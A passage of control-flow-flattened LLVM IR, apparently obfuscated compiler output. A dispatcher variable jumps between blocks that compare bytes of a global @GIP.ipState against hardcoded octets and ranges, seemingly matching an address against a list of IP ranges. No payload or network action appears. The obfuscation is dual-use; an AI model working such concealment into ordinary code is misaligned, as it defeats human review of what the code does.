  %1486 = zext i8 %1485 to i32
  %1487 = icmp eq i32 %1486, 67
  %1488 = select i1 %1487, i32 1597365132, i32 1131522707
  store i32 %1488, i32* %switchVar
  br label %loopEnd

; <label>:1489:                                   ; preds = %loopEntry
  %1490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1491 = zext i8 %1490 to i32
  %1492 = icmp eq i32 %1491, 205
  %1493 = select i1 %1492, i32 1102379008, i32 1131522707
  store i32 %1493, i32* %switchVar
  br label %loopEnd

; <label>:1494:                                   ; preds = %loopEntry
  %1495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1496 = zext i8 %1495 to i32
  %1497 = icmp sge i32 %1496, 128
  %1498 = select i1 %1497, i32 1537597215, i32 1131522707
  store i32 %1498, i32* %switchVar
  br label %loopEnd

; <label>:1499:                                   ; preds = %loopEntry
  %1500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1501 = zext i8 %1500 to i32
  %1502 = icmp slt i32 %1501, 191
  %1503 = select i1 %1502, i32 -886816699, i32 1131522707
  store i32 %1503, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1504:                                   ; preds = %loopEntry
  %1505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1506 = zext i8 %1505 to i32
  %1507 = icmp eq i32 %1506, 80
  %1508 = select i1 %1507, i32 -965013109, i32 292132852
  store i32 %1508, i32* %switchVar
  br label %loopEnd

; <label>:1509:                                   ; preds = %loopEntry
  %1510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1511 = zext i8 %1510 to i32
  %1512 = icmp eq i32 %1511, 240
  %1513 = select i1 %1512, i32 1417057381, i32 292132852
  store i32 %1513, i32* %switchVar
  br label %loopEnd

; <label>:1514:                                   ; preds = %loopEntry
  %1515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1516 = zext i8 %1515 to i32
  %1517 = icmp sge i32 %1516, 128
  %1518 = select i1 %1517, i32 651874224, i32 292132852
  store i32 %1518, i32* %switchVar
  br label %loopEnd

; <label>:1519:                                   ; preds = %loopEntry
  %1520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1521 = zext i8 %1520 to i32
  %1522 = icmp slt i32 %1521, 143
  %1523 = select i1 %1522, i32 -886816699, i32 292132852
  store i32 %1523, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1524:                                   ; preds = %loopEntry
  %1525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1526 = zext i8 %1525 to i32
  %1527 = icmp eq i32 %1526, 82
  %1528 = select i1 %1527, i32 -1186976762, i32 69745622
  store i32 %1528, i32* %switchVar
  br label %loopEnd

; <label>:1529:                                   ; preds = %loopEntry
  %1530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1531 = zext i8 %1530 to i32
  %1532 = icmp eq i32 %1531, 196
  %1533 = select i1 %1532, i32 1023038012, i32 69745622
  store i32 %1533, i32* %switchVar
  br label %loopEnd

; <label>:1534:                                   ; preds = %loopEntry
  %1535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1536 = zext i8 %1535 to i32
  %1537 = icmp sge i32 %1536, 1
  %1538 = select i1 %1537, i32 224866705, i32 69745622
  store i32 %1538, i32* %switchVar
  br label %loopEnd

; <label>:1539:                                   ; preds = %loopEntry
  %1540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1541 = zext i8 %1540 to i32
  %1542 = icmp slt i32 %1541, 15
  %1543 = select i1 %1542, i32 -886816699, i32 69745622
  store i32 %1543, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1544:                                   ; preds = %loopEntry
  %1545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1546 = zext i8 %1545 to i32
  %1547 = icmp eq i32 %1546, 95
  %1548 = select i1 %1547, i32 -1474839836, i32 485816814
  store i32 %1548, i32* %switchVar
  br label %loopEnd

; <label>:1549:                                   ; preds = %loopEntry
  %1550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1551 = zext i8 %1550 to i32
  %1552 = icmp eq i32 %1551, 85
  %1553 = select i1 %1552, i32 -1202715890, i32 485816814
  store i32 %1553, i32* %switchVar
  br label %loopEnd

; <label>:1554:                                   ; preds = %loopEntry
  %1555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1556 = zext i8 %1555 to i32
  %1557 = icmp sge i32 %1556, 8
  %1558 = select i1 %1557, i32 1113754721, i32 485816814
  store i32 %1558, i32* %switchVar
  br label %loopEnd

; <label>:1559:                                   ; preds = %loopEntry
  %1560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1561 = zext i8 %1560 to i32
  %1562 = icmp slt i32 %1561, 63
  %1563 = select i1 %1562, i32 -886816699, i32 485816814
  store i32 %1563, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1564:                                   ; preds = %loopEntry
  %1565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1566 = zext i8 %1565 to i32
  %1567 = icmp eq i32 %1566, 64
  %1568 = select i1 %1567, i32 -1220165055, i32 1667850261
  store i32 %1568, i32* %switchVar
  br label %loopEnd

; <label>:1569:                                   ; preds = %loopEntry
  %1570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1571 = zext i8 %1570 to i32
  %1572 = icmp eq i32 %1571, 237
  %1573 = select i1 %1572, i32 -199339232, i32 1667850261
  store i32 %1573, i32* %switchVar
  br label %loopEnd

; <label>:1574:                                   ; preds = %loopEntry
  %1575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1576 = zext i8 %1575 to i32
  %1577 = icmp sge i32 %1576, 32
  %1578 = select i1 %1577, i32 -371706397, i32 1667850261
  store i32 %1578, i32* %switchVar
  br label %loopEnd

; <label>:1579:                                   ; preds = %loopEntry
  %1580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1581 = zext i8 %1580 to i32
  %1582 = icmp slt i32 %1581, 43
  %1583 = select i1 %1582, i32 -886816699, i32 1667850261
  store i32 %1583, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1584:                                   ; preds = %loopEntry
  %1585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1586 = zext i8 %1585 to i32
  %1587 = icmp eq i32 %1586, 185
  %1588 = select i1 %1587, i32 -1278434776, i32 -949999897
  store i32 %1588, i32* %switchVar
  br label %loopEnd

; <label>:1589:                                   ; preds = %loopEntry
  %1590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1591 = zext i8 %1590 to i32
  %1592 = icmp eq i32 %1591, 92
  %1593 = select i1 %1592, i32 324766, i32 -949999897
  store i32 %1593, i32* %switchVar
  br label %loopEnd

; <label>:1594:                                   ; preds = %loopEntry
  %1595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1596 = zext i8 %1595 to i32
  %1597 = icmp sge i32 %1596, 220
  %1598 = select i1 %1597, i32 -1951254249, i32 -949999897
  store i32 %1598, i32* %switchVar
  br label %loopEnd

; <label>:1599:                                   ; preds = %loopEntry
  %1600 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1601 = zext i8 %1600 to i32
  %1602 = icmp slt i32 %1601, 223
  %1603 = select i1 %1602, i32 -886816699, i32 -949999897
  store i32 %1603, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1604:                                   ; preds = %loopEntry
  %1605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1606 = zext i8 %1605 to i32
  %1607 = icmp eq i32 %1606, 104
  %1608 = select i1 %1607, i32 -2006187687, i32 1991917107
  store i32 %1608, i32* %switchVar
  br label %loopEnd

; <label>:1609:                                   ; preds = %loopEntry
  %1610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1611 = zext i8 %1610 to i32
  %1612 = icmp eq i32 %1611, 238
  %1613 = select i1 %1612, i32 -218317690, i32 1991917107
  store i32 %1613, i32* %switchVar
  br label %loopEnd

; <label>:1614:                                   ; preds = %loopEntry
  %1615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1616 = zext i8 %1615 to i32
  %1617 = icmp sge i32 %1616, 128
  %1618 = select i1 %1617, i32 -1441175830, i32 1991917107
  store i32 %1618, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  %1620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1621 = zext i8 %1620 to i32
  %1622 = icmp slt i32 %1621, 191
  %1623 = select i1 %1622, i32 -886816699, i32 1991917107
  store i32 %1623, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1626 = zext i8 %1625 to i32
  %1627 = icmp eq i32 %1626, 209
  %1628 = select i1 %1627, i32 -191344941, i32 1467084835
  store i32 %1628, i32* %switchVar
  br label %loopEnd

; <label>:1629:                                   ; preds = %loopEntry
  %1630 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1631 = zext i8 %1630 to i32
  %1632 = icmp eq i32 %1631, 222
  %1633 = select i1 %1632, i32 1204136542, i32 1467084835
  store i32 %1633, i32* %switchVar
  br label %loopEnd

; <label>:1634:                                   ; preds = %loopEntry
  %1635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1636 = zext i8 %1635 to i32
  %1637 = icmp sge i32 %1636, 1
  %1638 = select i1 %1637, i32 1950730798, i32 1467084835
  store i32 %1638, i32* %switchVar
  br label %loopEnd

; <label>:1639:                                   ; preds = %loopEntry
  %1640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1641 = zext i8 %1640 to i32
  %1642 = icmp slt i32 %1641, 31
  %1643 = select i1 %1642, i32 -886816699, i32 1467084835
  store i32 %1643, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1644:                                   ; preds = %loopEntry
  %1645 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1646 = zext i8 %1645 to i32
  %1647 = icmp eq i32 %1646, 208
  %1648 = select i1 %1647, i32 -1058031965, i32 662143930
  store i32 %1648, i32* %switchVar
  br label %loopEnd

; <label>:1649:                                   ; preds = %loopEntry
  %1650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1651 = zext i8 %1650 to i32
  %1652 = icmp eq i32 %1651, 167
  %1653 = select i1 %1652, i32 -584864347, i32 662143930
  store i32 %1653, i32* %switchVar
  br label %loopEnd

; <label>:1654:                                   ; preds = %loopEntry
  %1655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1656 = zext i8 %1655 to i32
  %1657 = icmp sge i32 %1656, 232
  %1658 = select i1 %1657, i32 1365588958, i32 662143930
  store i32 %1658, i32* %switchVar
  br label %loopEnd

; <label>:1659:                                   ; preds = %loopEntry
  %1660 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1661 = zext i8 %1660 to i32
  %1662 = icmp slt i32 %1661, 252
  %1663 = select i1 %1662, i32 -886816699, i32 662143930
  store i32 %1663, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1664:                                   ; preds = %loopEntry
  %1665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1666 = zext i8 %1665 to i32
  %1667 = icmp eq i32 %1666, 66
  %1668 = select i1 %1667, i32 203215531, i32 602262521
  store i32 %1668, i32* %switchVar
  br label %loopEnd

; <label>:1669:                                   ; preds = %loopEntry
  %1670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1671 = zext i8 %1670 to i32
  %1672 = icmp eq i32 %1671, 55
  %1673 = select i1 %1672, i32 1886637277, i32 602262521
  store i32 %1673, i32* %switchVar
  br label %loopEnd

; <label>:1674:                                   ; preds = %loopEntry
  %1675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1676 = zext i8 %1675 to i32
  %1677 = icmp sge i32 %1676, 128
  %1678 = select i1 %1677, i32 -610264303, i32 602262521
  store i32 %1678, i32* %switchVar
  br label %loopEnd

; <label>:1679:                                   ; preds = %loopEntry
  %1680 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1681 = zext i8 %1680 to i32
  %1682 = icmp slt i32 %1681, 159
  %1683 = select i1 %1682, i32 -886816699, i32 602262521
  store i32 %1683, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1684:                                   ; preds = %loopEntry
  %1685 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1686 = zext i8 %1685 to i32
  %1687 = icmp eq i32 %1686, 45
  %1688 = select i1 %1687, i32 -2039150006, i32 389706211
  store i32 %1688, i32* %switchVar
  br label %loopEnd

; <label>:1689:                                   ; preds = %loopEntry
  %1690 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1691 = zext i8 %1690 to i32
  %1692 = icmp eq i32 %1691, 63
  %1693 = select i1 %1692, i32 -759407020, i32 389706211
  store i32 %1693, i32* %switchVar
  br label %loopEnd

; <label>:1694:                                   ; preds = %loopEntry
  %1695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1696 = zext i8 %1695 to i32
  %1697 = icmp sge i32 %1696, 1
  %1698 = select i1 %1697, i32 -2031931569, i32 389706211
  store i32 %1698, i32* %switchVar
  br label %loopEnd

; <label>:1699:                                   ; preds = %loopEntry
  %1700 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1701 = zext i8 %1700 to i32
  %1702 = icmp slt i32 %1701, 127
  %1703 = select i1 %1702, i32 -886816699, i32 389706211
  store i32 %1703, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1704:                                   ; preds = %loopEntry
  %1705 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1706 = zext i8 %1705 to i32
  %1707 = icmp eq i32 %1706, 216
  %1708 = select i1 %1707, i32 -242511594, i32 -298658719
  store i32 %1708, i32* %switchVar
  br label %loopEnd

; <label>:1709:                                   ; preds = %loopEntry
  %1710 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1711 = zext i8 %1710 to i32
  %1712 = icmp eq i32 %1711, 237
  %1713 = select i1 %1712, i32 517202191, i32 -298658719
  store i32 %1713, i32* %switchVar
  br label %loopEnd

; <label>:1714:                                   ; preds = %loopEntry
  %1715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1716 = zext i8 %1715 to i32
  %1717 = icmp sge i32 %1716, 128
  %1718 = select i1 %1717, i32 220691021, i32 -298658719
  store i32 %1718, i32* %switchVar
  br label %loopEnd

; <label>:1719:                                   ; preds = %loopEntry
  %1720 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1721 = zext i8 %1720 to i32
  %1722 = icmp slt i32 %1721, 159
  %1723 = select i1 %1722, i32 -886816699, i32 -298658719
  store i32 %1723, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1726 = zext i8 %1725 to i32
  %1727 = icmp eq i32 %1726, 108
  %1728 = select i1 %1727, i32 -157359607, i32 2123132978
  store i32 %1728, i32* %switchVar
  br label %loopEnd

; <label>:1729:                                   ; preds = %loopEntry
  %1730 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1731 = zext i8 %1730 to i32
  %1732 = icmp eq i32 %1731, 61
  %1733 = select i1 %1732, i32 -886816699, i32 2123132978
  store i32 %1733, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1734:                                   ; preds = %loopEntry
  %1735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1736 = zext i8 %1735 to i32
  %1737 = icmp eq i32 %1736, 45
  %1738 = select i1 %1737, i32 -1701397355, i32 539487337
  store i32 %1738, i32* %switchVar
  br label %loopEnd

; <label>:1739:                                   ; preds = %loopEntry
  %1740 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1741 = zext i8 %1740 to i32
  %1742 = icmp eq i32 %1741, 76
  %1743 = select i1 %1742, i32 -886816699, i32 539487337
  store i32 %1743, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1744:                                   ; preds = %loopEntry
  %1745 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1746 = zext i8 %1745 to i32
  %1747 = icmp eq i32 %1746, 185
  %1748 = select i1 %1747, i32 -246908392, i32 1719155527
  store i32 %1748, i32* %switchVar
  br label %loopEnd

; <label>:1749:                                   ; preds = %loopEntry
  %1750 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1751 = zext i8 %1750 to i32
  %1752 = icmp eq i32 %1751, 11
  %1753 = select i1 %1752, i32 1838407379, i32 1719155527
  store i32 %1753, i32* %switchVar
  br label %loopEnd

; <label>:1754:                                   ; preds = %loopEntry
  %1755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1756 = zext i8 %1755 to i32
  %1757 = icmp sge i32 %1756, 144
  %1758 = select i1 %1757, i32 -46643897, i32 1719155527
  store i32 %1758, i32* %switchVar
  br label %loopEnd

; <label>:1759:                                   ; preds = %loopEntry
  %1760 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1761 = zext i8 %1760 to i32
  %1762 = icmp slt i32 %1761, 148
  %1763 = select i1 %1762, i32 -886816699, i32 1719155527
  store i32 %1763, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1764:                                   ; preds = %loopEntry
  %1765 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1766 = zext i8 %1765 to i32
  %1767 = icmp eq i32 %1766, 185
  %1768 = select i1 %1767, i32 -1166839056, i32 1316766719
  store i32 %1768, i32* %switchVar
  br label %loopEnd

; <label>:1769:                                   ; preds = %loopEntry
  %1770 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1771 = zext i8 %1770 to i32
  %1772 = icmp eq i32 %1771, 56
  %1773 = select i1 %1772, i32 828027474, i32 1316766719
  store i32 %1773, i32* %switchVar
  br label %loopEnd

; <label>:1774:                                   ; preds = %loopEntry
  %1775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1776 = zext i8 %1775 to i32
  %1777 = icmp sge i32 %1776, 21
  %1778 = select i1 %1777, i32 -172718762, i32 1316766719
  store i32 %1778, i32* %switchVar
  br label %loopEnd

; <label>:1779:                                   ; preds = %loopEntry
  %1780 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1781 = zext i8 %1780 to i32
  %1782 = icmp slt i32 %1781, 23
  %1783 = select i1 %1782, i32 -886816699, i32 1316766719
  store i32 %1783, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1784:                                   ; preds = %loopEntry
  %1785 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1786 = zext i8 %1785 to i32
  %1787 = icmp eq i32 %1786, 185
  %1788 = select i1 %1787, i32 1238664149, i32 66930239
  store i32 %1788, i32* %switchVar
  br label %loopEnd

; <label>:1789:                                   ; preds = %loopEntry
  %1790 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1791 = zext i8 %1790 to i32
  %1792 = icmp eq i32 %1791, 61
  %1793 = select i1 %1792, i32 1076696581, i32 66930239
  store i32 %1793, i32* %switchVar
  br label %loopEnd

; <label>:1794:                                   ; preds = %loopEntry
  %1795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1796 = zext i8 %1795 to i32
  %1797 = icmp sge i32 %1796, 136
  %1798 = select i1 %1797, i32 -1135455452, i32 66930239
  store i32 %1798, i32* %switchVar
  br label %loopEnd

; <label>:1799:                                   ; preds = %loopEntry
  %1800 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1801 = zext i8 %1800 to i32
  %1802 = icmp slt i32 %1801, 139
  %1803 = select i1 %1802, i32 -886816699, i32 66930239
  store i32 %1803, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1804:                                   ; preds = %loopEntry
  %1805 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1806 = zext i8 %1805 to i32
  %1807 = icmp eq i32 %1806, 185
  %1808 = select i1 %1807, i32 -119354522, i32 2121048409
  store i32 %1808, i32* %switchVar
  br label %loopEnd

; <label>:1809:                                   ; preds = %loopEntry
  %1810 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1811 = zext i8 %1810 to i32
  %1812 = icmp eq i32 %1811, 62
  %1813 = select i1 %1812, i32 -62005228, i32 2121048409
  store i32 %1813, i32* %switchVar
  br label %loopEnd

; <label>:1814:                                   ; preds = %loopEntry
  %1815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1816 = zext i8 %1815 to i32
  %1817 = icmp sge i32 %1816, 187
  %1818 = select i1 %1817, i32 183961182, i32 2121048409
  store i32 %1818, i32* %switchVar
  br label %loopEnd

; <label>:1819:                                   ; preds = %loopEntry
  %1820 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1821 = zext i8 %1820 to i32
  %1822 = icmp slt i32 %1821, 191
  %1823 = select i1 %1822, i32 -886816699, i32 2121048409
  store i32 %1823, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1824:                                   ; preds = %loopEntry
  %1825 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1826 = zext i8 %1825 to i32
  %1827 = icmp eq i32 %1826, 66
  %1828 = select i1 %1827, i32 2043751555, i32 1080367629
  store i32 %1828, i32* %switchVar
  br label %loopEnd

; <label>:1829:                                   ; preds = %loopEntry
  %1830 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1831 = zext i8 %1830 to i32
  %1832 = icmp eq i32 %1831, 150
  %1833 = select i1 %1832, i32 714639687, i32 1080367629
  store i32 %1833, i32* %switchVar
  br label %loopEnd

; <label>:1834:                                   ; preds = %loopEntry
  %1835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1836 = zext i8 %1835 to i32
  %1837 = icmp sge i32 %1836, 120
  %1838 = select i1 %1837, i32 -1327528136, i32 1080367629
  store i32 %1838, i32* %switchVar
  br label %loopEnd

; <label>:1839:                                   ; preds = %loopEntry
  %1840 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1841 = zext i8 %1840 to i32
  %1842 = icmp slt i32 %1841, 215
  %1843 = select i1 %1842, i32 -886816699, i32 1080367629
  store i32 %1843, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1844:                                   ; preds = %loopEntry
  %1845 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1846 = zext i8 %1845 to i32
  %1847 = icmp eq i32 %1846, 66
  %1848 = select i1 %1847, i32 -1151428489, i32 556505407
  store i32 %1848, i32* %switchVar
  br label %loopEnd

; <label>:1849:                                   ; preds = %loopEntry
  %1850 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1851 = zext i8 %1850 to i32
  %1852 = icmp eq i32 %1851, 151
  %1853 = select i1 %1852, i32 1888495187, i32 556505407
  store i32 %1853, i32* %switchVar
  br label %loopEnd

; <label>:1854:                                   ; preds = %loopEntry
  %1855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1856 = zext i8 %1855 to i32
  %1857 = icmp sge i32 %1856, 137
  %1858 = select i1 %1857, i32 -1081454691, i32 556505407
  store i32 %1858, i32* %switchVar
  br label %loopEnd

; <label>:1859:                                   ; preds = %loopEntry
  %1860 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1861 = zext i8 %1860 to i32
  %1862 = icmp slt i32 %1861, 139
  %1863 = select i1 %1862, i32 -886816699, i32 556505407
  store i32 %1863, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1864:                                   ; preds = %loopEntry
  %1865 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1866 = zext i8 %1865 to i32
  %1867 = icmp eq i32 %1866, 64
  %1868 = select i1 %1867, i32 85084154, i32 -1613005230
  store i32 %1868, i32* %switchVar
  br label %loopEnd

; <label>:1869:                                   ; preds = %loopEntry
  %1870 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1871 = zext i8 %1870 to i32
  %1872 = icmp eq i32 %1871, 94
  %1873 = select i1 %1872, i32 1488742240, i32 -1613005230
  store i32 %1873, i32* %switchVar
  br label %loopEnd

; <label>:1874:                                   ; preds = %loopEntry
  %1875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1876 = zext i8 %1875 to i32
  %1877 = icmp sge i32 %1876, 237
  %1878 = select i1 %1877, i32 -1071269603, i32 -1613005230
  store i32 %1878, i32* %switchVar
  br label %loopEnd

; <label>:1879:                                   ; preds = %loopEntry
  %1880 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1881 = zext i8 %1880 to i32
  %1882 = icmp slt i32 %1881, 255
  %1883 = select i1 %1882, i32 -886816699, i32 -1613005230
  store i32 %1883, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1884:                                   ; preds = %loopEntry
  %1885 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1886 = zext i8 %1885 to i32
  %1887 = icmp eq i32 %1886, 63
  %1888 = select i1 %1887, i32 -1042856458, i32 1822862343
